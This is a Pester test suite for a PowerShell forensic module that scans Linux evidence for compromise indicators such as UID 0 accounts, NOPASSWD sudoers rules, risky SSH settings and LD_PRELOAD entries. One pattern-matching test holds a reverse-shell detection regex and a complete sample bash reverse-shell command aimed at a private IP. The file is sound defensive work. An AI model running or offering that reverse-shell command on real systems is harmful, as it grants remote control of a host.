#Requires -Module Pester

BeforeAll {
    $ModuleRoot = Split-Path -Parent $PSScriptRoot

    # Dot-source all module files directly so private functions are accessible
    $PrivateFunctions = Get-ChildItem -Path "$ModuleRoot/Private" -Recurse -Filter '*.ps1' -ErrorAction SilentlyContinue
    $PublicFunctions = Get-ChildItem -Path "$ModuleRoot/Public" -Filter '*.ps1' -ErrorAction SilentlyContinue

    foreach ($file in @($PrivateFunctions + $PublicFunctions)) {
        . $file.FullName
    }

    # Set module-scoped variables
    $Script:ModuleRoot = $ModuleRoot
    $Script:DefaultRules = $null
    $Script:SeverityOrder = @{
        'Critical'      = 0
        'High'          = 1
        'Medium'        = 2
        'Low'           = 3
        'Informational' = 4
    }

    # Load default rules
    $rulesPath = Join-Path $ModuleRoot 'Config' 'DefaultRules.yaml'
    if (Test-Path $rulesPath) {
        $Script:DefaultRules = Import-YamlConfig -Path $rulesPath
    }

    $TestDataPath = Join-Path $PSScriptRoot 'TestData'
}

Describe 'Module Structure' {
    It 'Has a valid module manifest' {
        $manifestPath = Join-Path $ModuleRoot 'PWSPostProcessingSuite.psd1'
        Test-Path $manifestPath | Should -BeTrue
        { Test-ModuleManifest -Path $manifestPath -ErrorAction Stop } | Should -Not -Throw
    }

    It 'Has a root module file' {
        Test-Path (Join-Path $ModuleRoot 'PWSPostProcessingSuite.psm1') | Should -BeTrue
    }

    It 'Has default rules config' {
        Test-Path (Join-Path $ModuleRoot 'Config' 'DefaultRules.yaml') | Should -BeTrue
    }

    It 'Has all expected analyzer files' {
        $expectedAnalyzers = @(
            'Invoke-UserAccountAnalyzer', 'Invoke-SudoersAnalyzer', 'Invoke-SSHConfigAnalyzer',
            'Invoke-PAMAnalyzer', 'Invoke-CronAnalyzer', 'Invoke-SystemdAnalyzer',
            'Invoke-ShellProfileAnalyzer', 'Invoke-ShellHistoryAnalyzer', 'Invoke-SSHKeyAnalyzer',
            'Invoke-SysctlAnalyzer', 'Invoke-FstabAnalyzer', 'Invoke-NetworkConfigAnalyzer',
            'Invoke-FirewallAnalyzer', 'Invoke-WebServerAnalyzer', 'Invoke-AuthLogAnalyzer',
            'Invoke-SyslogAnalyzer', 'Invoke-AuditLogAnalyzer', 'Invoke-PackageLogAnalyzer',
            'Invoke-KernelModuleAnalyzer', 'Invoke-LDPreloadAnalyzer', 'Invoke-EnvironmentAnalyzer',
            'Invoke-ProcessAnalyzer', 'Invoke-FilesystemAnalyzer', 'Invoke-LogIntegrityAnalyzer',
            'Invoke-ContainerAnalyzer'
        )
        foreach ($analyzer in $expectedAnalyzers) {
            $path = Join-Path $ModuleRoot "Private/Analyzers/${analyzer}.ps1"
            Test-Path $path | Should -BeTrue -Because "$analyzer.ps1 should exist"
        }
    }
}

Describe 'New-Finding' {
    It 'Creates a finding with correct properties' {
        $finding = New-Finding -Id 'TEST-001' -Severity 'High' -Category 'Test' `
            -Title 'Test Finding' -Description 'A test finding'

        $finding.Id | Should -Be 'TEST-001'
        $finding.Severity | Should -Be 'High'
        $finding.Category | Should -Be 'Test'
        $finding.Title | Should -Be 'Test Finding'
        $finding.Description | Should -Be 'A test finding'
    }

    It 'Sets PSTypeName to PWSPostProcessingSuite.Finding' {
        $finding = New-Finding -Id 'TEST-002' -Severity 'Low' -Category 'Test' `
            -Title 'Type Test' -Description 'Testing type'

        $finding.PSTypeNames | Should -Contain 'PWSPostProcessingSuite.Finding'
    }

    It 'Accepts optional parameters' {
        $ts = Get-Date
        $finding = New-Finding -Id 'TEST-003' -Severity 'Critical' -Category 'Test' `
            -Title 'Full Test' -Description 'All params' `
            -ArtifactPath '/etc/passwd' -Evidence @('line 1', 'line 2') `
            -Recommendation 'Fix it' -Timestamp $ts -MITRE 'T1078'

        $finding.ArtifactPath | Should -Be '/etc/passwd'
        $finding.Evidence.Count | Should -Be 2
        $finding.Recommendation | Should -Be 'Fix it'
        $finding.Timestamp | Should -Be $ts
        $finding.MITRE | Should -Be 'T1078'
    }

    It 'Rejects invalid severity values' {
        { New-Finding -Id 'TEST-004' -Severity 'Invalid' -Category 'Test' `
            -Title 'Bad Severity' -Description 'Should fail' } | Should -Throw
    }
}

Describe 'Resolve-ArtifactPath' {
    It 'Finds files in mirror structure' {
        $result = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/passwd'
        Test-Path $result | Should -BeTrue
    }

    It 'Handles leading slash correctly' {
        $result1 = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath '/etc/passwd'
        $result2 = Resolve-ArtifactPath -EvidencePath $TestDataPath -LinuxPath 'etc/passwd'
        $result1 | Should -Be $result2
    }
}

Describe 'Read-ArtifactContent' {
    It 'Reads file content as array of lines' {
        $path = Join-Path $TestDataPath 'etc' 'passwd'
        $content = Read-ArtifactContent -Path $path
        $content | Should -Not -BeNullOrEmpty
        $content.Count | Should -BeGreaterThan 5
    }

    It 'Returns empty array for missing files' {
        $content = Read-ArtifactContent -Path '/nonexistent/file'
        $content | Should -Not -BeNull
        $content.Count | Should -Be 0
    }

    It 'Respects MaxLines parameter' {
        $path = Join-Path $TestDataPath 'etc' 'passwd'
        $content = Read-ArtifactContent -Path $path -MaxLines 3
        $content.Count | Should -BeLessOrEqual 3
    }
}

Describe 'Test-ArtifactExists' {
    It 'Returns true for existing artifacts' {
        Test-ArtifactExists -EvidencePath $TestDataPath -LinuxPath '/etc/passwd' | Should -BeTrue
    }

    It 'Returns false for missing artifacts' {
        Test-ArtifactExists -EvidencePath $TestDataPath -LinuxPath '/etc/nonexistent' | Should -BeFalse
    }
}

Describe 'Test-PatternMatch' {
    It 'Matches a known pattern' {
        $patterns = @(
            @{ pattern = 'bash\s+-i.*>/dev/tcp/'; severity = 'Critical'; mitre = 'T1059.004' }
        )
        $result = Test-PatternMatch -InputText 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' -Patterns $patterns
        $result.Matched | Should -BeTrue
        $result.Severity | Should -Be 'Critical'
    }

    It 'Returns false for non-matching input' {
        $patterns = @(
            @{ pattern = 'malicious_pattern'; severity = 'High' }
        )
        $result = Test-PatternMatch -InputText 'normal command ls -la' -Patterns $patterns
        $result.Matched | Should -BeFalse
    }
}

Describe 'ConvertTo-Timeline' {
    It 'Converts findings with timestamps to sorted timeline' {
        $findings = @(
            (New-Finding -Id 'T1' -Severity 'High' -Category 'Test' -Title 'Later' -Description 'Later event' -Timestamp ([datetime]'2025-03-15 14:00:00'))
            (New-Finding -Id 'T2' -Severity 'Critical' -Category 'Test' -Title 'Earlier' -Description 'Earlier event' -Timestamp ([datetime]'2025-03-15 10:00:00'))
            (New-Finding -Id 'T3' -Severity 'Low' -Category 'Test' -Title 'No timestamp' -Description 'Should be excluded')
        )

        $timeline = $findings | ConvertTo-Timeline
        $timeline.Count | Should -Be 2
        $timeline[0].Title | Should -Be 'Earlier'
        $timeline[1].Title | Should -Be 'Later'
    }
}

Describe 'UserAccount Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-UserAccountAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects non-root UID 0 account' {
        $uid0 = $findings | Where-Object { $_.Id -eq 'ACCT-001' }
        $uid0 | Should -Not -BeNullOrEmpty
        $uid0.Severity | Should -Be 'Critical'
    }

    It 'Detects empty password in shadow' {
        $emptyPw = $findings | Where-Object { $_.Id -eq 'ACCT-002' }
        $emptyPw | Should -Not -BeNullOrEmpty
    }

    It 'Detects weak hash algorithm (MD5)' {
        $weakHash = $findings | Where-Object { $_.Id -eq 'ACCT-006' }
        $weakHash | Should -Not -BeNullOrEmpty
    }

    It 'Detects service account with interactive shell' {
        $svcShell = $findings | Where-Object { $_.Id -eq 'ACCT-003' }
        $svcShell | Should -Not -BeNullOrEmpty
    }
}

Describe 'Sudoers Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-SudoersAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects NOPASSWD ALL rule' {
        $nopasswd = $findings | Where-Object { $_.Id -eq 'SUDO-001' }
        $nopasswd | Should -Not -BeNullOrEmpty
        $nopasswd.Severity | Should -Be 'Critical'
    }

    It 'Detects dangerous binaries in sudoers' {
        $dangerous = $findings | Where-Object { $_.Id -eq 'SUDO-003' }
        $dangerous | Should -Not -BeNullOrEmpty
    }
}

Describe 'SSHConfig Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-SSHConfigAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects PermitRootLogin yes' {
        $rootLogin = $findings | Where-Object { $_.Id -eq 'SSH-001' }
        $rootLogin | Should -Not -BeNullOrEmpty
        $rootLogin.Severity | Should -Be 'Critical'
    }

    It 'Detects PasswordAuthentication yes' {
        $pwAuth = $findings | Where-Object { $_.Id -eq 'SSH-002' }
        $pwAuth | Should -Not -BeNullOrEmpty
    }

    It 'Detects high MaxAuthTries' {
        $maxAuth = $findings | Where-Object { $_.Id -eq 'SSH-007' }
        $maxAuth | Should -Not -BeNullOrEmpty
    }
}

Describe 'ShellHistory Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-ShellHistoryAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects suspicious commands in history' {
        $suspicious = $findings | Where-Object { $_.Id -eq 'HIST-001' }
        $suspicious | Should -Not -BeNullOrEmpty
    }

    It 'Finds history files' {
        $summary = $findings | Where-Object { $_.Id -eq 'HIST-002' }
        $summary | Should -Not -BeNullOrEmpty
    }
}

Describe 'AuthLog Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-AuthLogAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects brute force attempts' {
        $bruteForce = $findings | Where-Object { $_.Id -eq 'AUTH-002' -or $_.Id -eq 'AUTH-001' }
        $bruteForce | Should -Not -BeNullOrEmpty
    }

    It 'Produces findings' {
        $findings.Count | Should -BeGreaterThan 0
    }
}

Describe 'Cron Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-CronAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects suspicious cron entries' {
        $suspicious = $findings | Where-Object { $_.Severity -in @('Critical', 'High') }
        $suspicious | Should -Not -BeNullOrEmpty
    }
}

Describe 'Sysctl Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-SysctlAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects ASLR disabled' {
        $aslr = $findings | Where-Object { $_.Title -match 'ASLR' }
        $aslr | Should -Not -BeNullOrEmpty
        $aslr.Severity | Should -Be 'High'
    }

    It 'Detects IP forwarding enabled' {
        $ipfwd = $findings | Where-Object { $_.Title -match 'IP forwarding' }
        $ipfwd | Should -Not -BeNullOrEmpty
    }
}

Describe 'LDPreload Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-LDPreloadAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects entries in ld.so.preload' {
        $preload = $findings | Where-Object { $_.Id -eq 'LDPRE-001' }
        $preload | Should -Not -BeNullOrEmpty
        $preload.Severity | Should -Be 'Critical'
    }
}

Describe 'Fstab Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-FstabAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects missing noexec on /tmp' {
        $noexec = $findings | Where-Object { $_.Id -eq 'FSTAB-001' -and $_.Title -match '/tmp' }
        $noexec | Should -Not -BeNullOrEmpty
    }
}

Describe 'Environment Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-EnvironmentAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects suspicious PATH entries' {
        $pathIssue = $findings | Where-Object { $_.Id -eq 'ENV-003' }
        $pathIssue | Should -Not -BeNullOrEmpty
    }
}

Describe 'SSHKey Analyzer' {
    BeforeAll {
        $rules = if ($Script:DefaultRules) { $Script:DefaultRules } else { @{} }
        $findings = Invoke-SSHKeyAnalyzer -EvidencePath $TestDataPath -Rules $rules
    }

    It 'Detects command-restricted SSH keys' {
        $cmdKey = $findings | Where-Object { $_.Id -eq 'SSHKEY-001' }
        $cmdKey | Should -Not -BeNullOrEmpty
    }
}

Describe 'Reporting Functions' {
    BeforeAll {
        $testFindings = @(
            (New-Finding -Id 'RPT-001' -Severity 'Critical' -Category 'Test' -Title 'Critical Test' -Description 'Critical finding' -MITRE 'T1078')
            (New-Finding -Id 'RPT-002' -Severity 'High' -Category 'Test' -Title 'High Test' -Description 'High finding')
            (New-Finding -Id 'RPT-003' -Severity 'Low' -Category 'Test' -Title 'Low Test' -Description 'Low finding')
        )
        $testTimeline = $testFindings | ConvertTo-Timeline
    }

    Context 'Export-CsvReport' {
        It 'Creates a CSV file' {
            $csvPath = Join-Path $TestDrive 'test.csv'
            Export-CsvReport -Findings $testFindings -OutputPath $csvPath
            Test-Path $csvPath | Should -BeTrue
        }

        It 'Contains all findings' {
            $csvPath = Join-Path $TestDrive 'test2.csv'
            Export-CsvReport -Findings $testFindings -OutputPath $csvPath
            $csv = Import-Csv $csvPath
            $csv.Count | Should -Be 3
        }
    }

    Context 'Export-HtmlReport' {
        It 'Creates an HTML file' {
            $htmlPath = Join-Path $TestDrive 'test.html'
            $metadata = [PSCustomObject]@{
                EvidencePath  = '/test'
                ScanStart     = (Get-Date)
                ScanEnd       = (Get-Date)
                ScanDuration  = [timespan]::FromSeconds(5)
                AnalyzersRun  = 3
            }
            Export-HtmlReport -Findings $testFindings -Timeline @() -OutputPath $htmlPath -ScanMetadata $metadata
            Test-Path $htmlPath | Should -BeTrue
            $content = Get-Content $htmlPath -Raw
            $content | Should -Match 'Critical Test'
        }
    }

    Context 'Write-ConsoleSummary' {
        It 'Runs without errors' {
            $bySeverity = @{ Critical = 1; High = 1; Medium = 0; Low = 1; Informational = 0 }
            { Write-ConsoleSummary -Findings $testFindings -BySeverity $bySeverity } | Should -Not -Throw
        }
    }
}
